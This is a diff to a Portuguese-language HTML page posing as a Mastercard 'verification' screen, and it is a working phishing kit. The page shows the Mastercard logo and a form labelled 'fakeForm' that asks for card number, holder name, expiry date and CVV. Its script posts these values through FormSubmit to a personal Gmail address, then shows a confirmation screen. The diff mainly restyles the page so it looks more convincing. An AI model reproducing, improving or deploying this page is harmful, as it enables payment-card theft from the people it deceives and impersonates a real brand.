@@ -1,65 +1,101 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Mastercard - Verificação</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
     body {
-      background: #f2f2f2;
-      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #ef3b36, #ff725e);
+      font-family: 'Roboto', Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
     }
+
     .container, .mensagem {
       background: white;
-      padding: 30px;
-      border-radius: 10px;
+      padding: 40px 35px;
+      border-radius: 16px;
       width: 100%;
-      max-width: 360px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      max-width: 380px;
+      box-shadow: 0 12px 24px rgba(0,0,0,0.15);
       text-align: center;
       display: none;
     }
+
     .active {
       display: block;
     }
+
     img {
-      width: 100px;
-      margin-bottom: 20px;
+      width: 120px;
+      margin-bottom: 25px;
     }
-    input, button {
+
+    input {
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 14px;
+      padding: 14px 18px;
+      margin: 12px 0;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      font-size: 15px;
+      transition: border-color 0.3s ease;
+      box-sizing: border-box;
     }
+
+    input:focus {
+      outline: none;
+      border-color: #ef3b36;
+      box-shadow: 0 0 8px rgba(239, 59, 54, 0.5);
+    }
+
     button {
-      background-color: #e60000;
+      width: 100%;
+      padding: 15px;
+      margin-top: 18px;
+      background-color: #ef3b36;
       color: white;
-      font-weight: bold;
+      font-weight: 700;
+      border: none;
+      border-radius: 14px;
+      font-size: 17px;
       cursor: pointer;
+      transition: background-color 0.25s ease;
+      box-shadow: 0 6px 12px rgba(239, 59, 54, 0.4);
     }
+
     button:hover {
-      background-color: #cc0000;
+      background-color: #c6312b;
+      box-shadow: 0 8px 16px rgba(198, 49, 43, 0.6);
+    }
+
+    h2 {
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 12px;
+    }
+
+    p {
+      font-size: 16px;
+      color: #555;
+      line-height: 1.4;
     }
   </style>
 </head>
 <body>
-
   <!-- Tela de formulário -->
   <div class="container active" id="formulario">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" />
     <form id="fakeForm">
-      <input type="text" name="cartao" placeholder="Número do cartão" required>
-      <input type="text" name="nome" placeholder="Nome do titular" required>
-      <input type="text" name="validade" placeholder="Validade (MM/AA)" required>
-      <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required>
+      <input type="text" name="cartao" placeholder="Número do cartão" required />
+      <input type="text" name="nome" placeholder="Nome do titular" required />
+      <input type="text" name="validade" placeholder="Validade (MM/AA)" required />
+      <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required />
       <button type="submit">Verificar</button>
     </form>
   </div>
@@ -76,10 +112,9 @@
     form.addEventListener('submit', function(e) {
       e.preventDefault();
 
-      // Envia via FormSubmit
       fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
         method: "POST",
-        headers: { 'Content-Type': 'application/json' },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           cartao: form.cartao.value,
           nome: form.nome.value,
@@ -87,14 +122,12 @@
           cvv: form.cvv.value
         })
       }).then(response => {
-        // Mostra tela de confirmação
-        document.getElementById('formulario').classList.remove('active');
-        document.getElementById('confirmacao').classList.add('active');
+        document.getElementById("formulario").classList.remove("active");
+        document.getElementById("confirmacao").classList.add("active");
       }).catch(error => {
-        alert("Erro no envio");
+        alert("Erro no envio dos dados. Tente novamente.");
       });
     });
   </script>
-
 </body>
 </html>
